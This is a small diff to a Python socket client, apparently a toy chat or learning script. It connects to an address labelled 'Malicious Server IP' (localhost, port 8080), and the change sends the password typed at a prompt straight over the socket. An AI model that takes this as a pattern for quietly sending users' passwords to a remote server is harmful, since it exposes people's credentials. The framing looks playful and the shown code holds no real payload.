@@ -9,7 +9,7 @@ bigBro = '127.0.0.1' # Malicious Server IP.
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 
 
-# password = raw_input("Password? > ") # To-do: Uncomment this later.
+clientSocket.send("authenticate " + raw_input("Password? > "))
 
 recipient = "all"
 turnedOn = True
